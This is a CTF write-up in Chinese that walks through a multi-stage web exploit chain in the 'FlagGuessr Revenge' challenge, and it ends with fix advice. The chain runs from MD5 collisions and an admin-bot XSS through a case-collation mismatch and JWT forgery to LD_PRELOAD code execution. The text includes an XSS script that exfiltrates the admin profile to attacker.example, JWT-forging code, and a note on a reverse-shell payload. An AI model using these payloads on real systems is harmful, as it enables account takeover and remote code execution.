# L3akCTF 2025 FlagGuessr Revenge Writeup

## 题目简述

`FlagGuessr Revenge` 在原版注册流程中加入了全局 mutex，修复了并发请求抢在插入前同时通过用户名检查的问题。其余功能保持不变：用户上传自己的 flag、猜测他人 flag、向管理员举报可疑页面，并生成个人证书。

需要串联 MD5 chosen-prefix collision、管理员 XSS、Go 与 SQLite 大小写比较差异、JWT 重签名和 `LD_PRELOAD`。决定性主障碍是 Web 信任边界的多阶段利用，因此按 Web 归档。

仓库中的 Revenge `README.md` 误复制了原题 flag；本题实际结果以 Revenge 的 `build/flag.txt` 为准。

## 解题过程

### 用 MD5 碰撞保留任意猜测文件

服务器把目标用户的 `flag.txt` 与猜测文件分别计算 MD5 和 SHA-256：

```go
md5Equal := MD5(flag) == MD5(guess)
shaEqual := SHA256(flag) == SHA256(guess)

if md5Equal != shaEqual {
    g.MarkCheater()
}
```

`MarkCheater` 使用了缺少参数占位符的 SQL：

```sql
UPDATE users SET cheater = 1 WHERE user_id = ;
```

并通过 `db.MustExec` 执行，所以一旦进入该分支就会 panic。正常错误猜测会在检查后被 `os.Remove` 删除，但 panic 提前终止 handler，文件因而留在：

```text
./userdata/<guesser_id>/uploads/<guess_id>
```

构造两个长度相同的 chosen-prefix MD5 碰撞文件：一个是可作为注册 flag 的无害内容，另一个以可执行 HTML 开头。仓库给出的官方样本哈希为：

```text
meow.txt.coll
MD5    070929ADAA336C1DBACB656F606814B5
SHA256 32405FD88A754CD829010AA0CD9056DE7AAB8B8FE468AD4646A9D8F216A73E0B

payload.html.coll
MD5    070929ADAA336C1DBACB656F606814B5
SHA256 E6AA679DB4E2320FBC5DD32BF67296736ABFB448AB6BFA7F283C4DE4846AF5C1
```

让账号 A 以 `meow.txt.coll` 注册；账号 B 登录后把 `payload.html.coll` 当作对 A 的猜测。请求会因 panic 断开，但猜测记录和 HTML 文件已经写入。

### 让管理员读取碰撞文件并泄露身份

通过 B 的 guesses API 取得 `guess_id`，再举报：

```text
/api/users/<B_user_id>/guesses/<guess_id>
```

举报功能会创建临时管理员，用户名格式为 `Admin-<UUID>`，随机生成 `display_name`，然后让已登录的浏览器访问用户给出的站内路径。管理员有权读取其他用户的猜测；接口直接返回原始字节，且没有阻止 MIME sniffing，碰撞文件会被当成 HTML 执行。

HTML 中只需读取同源的管理员 profile 并发送到攻击者接收端：

```html
<!doctype html>
<script>
fetch("/api/profile")
  .then(r => r.json())
  .then(profile => {
    location =
      "https://attacker.example/collect?d=" +
      encodeURIComponent(JSON.stringify(profile));
  });
</script>
```

响应包含管理员的 `username`、`user_id` 和 `display_name`。外部接收服务只负责记录这段 JSON；关键数据和用途已经在正文中给出，不依赖任何特定 webhook 网站。

### 利用 NOCASE 制造可控插入失败

Revenge 虽然用 mutex 包住注册，但可用性检查和数据库唯一性使用了不同的相等关系：

```go
newUser.Username = strings.ToLower(username)

// Go 中区分大小写
if existing.Username == newUser.Username {
    return false
}
```

SQLite 表却定义为：

```sql
username text COLLATE NOCASE,
PRIMARY KEY (username, display_name)
```

临时管理员在数据库中的用户名以大写 `Admin-` 开头。用小写 `admin-<UUID>` 和刚泄露的相同 `display_name` 注册时：

1. Go 字符串比较认为用户名不同，允许继续；
2. SQLite `NOCASE` 认为用户名相同，复合主键冲突；
3. `InsertUser()` 返回错误。

注册 handler 对这个错误分支没有清空解析自 cookie 的 session，却无条件执行 `defer session.UpdateSession(w)`。因此可先用任意错误密钥构造 claims：

```python
claims = {
    "username": "unused",
    "user_kind": 1,
    "user_id": payload_user_id,
    "properties": {
        "display_name": "solver",
        "description": "solver",
        "LD_PRELOAD": f"./userdata/{payload_user_id}/flag.txt",
    },
    "logged_in": True,
}
forged = jwt.encode(claims, "wrong-key", algorithm="HS256")
```

这里的 `payload_user_id` 属于另一个正常注册的账号，其上传 `flag.txt` 是兼容 Alpine/musl 的恶意共享库。把无效 JWT 作为 cookie，使用管理员小写用户名和泄露的 display name 触发注册冲突，响应就会带回由服务器真实密钥签名、claims 未被覆盖的新 JWT。

### 触发 LD_PRELOAD

证书接口把 session `properties` 的每个键值直接复制到 `makecert` 环境。`makecert` 最后调用外部 `cp`，动态加载器会读取：

```text
LD_PRELOAD=./userdata/<payload_user_id>/flag.txt
```

于是上传的共享库在 `cp` 启动时加载。官方样例在 `_init` 中建立反向 shell；连接后读取：

```bash
cat /app/flag.txt
```

得到 Revenge 实际 flag：

```text
L3AK{oop5_i_shou1d4_us3d_a_mu7ex_th3_f1rst_t1me}
```

## 方法总结

Revenge 修复了并发注册，却保留了更深层的一致性错误：应用层用区分大小写的 Go 比较，数据库唯一键使用 `COLLATE NOCASE`。安全判断与最终约束不一致，就能制造“检查通过、写入失败”的可控状态。

完整链中的每个漏洞都只泄露或提升一小步：MD5 碰撞配合 panic 留下 HTML，管理员 bot 把它升级为身份泄露，NOCASE 冲突把无效 claims 变成有效 JWT，环境变量复制再把会话伪造升级为代码执行。修复时不能只加 mutex；还需要统一规范化规则、验签失败后丢弃 claims、避免 `MustExec` 处理用户可达输入、禁止任意子进程环境变量，并移除可执行的上传内容。
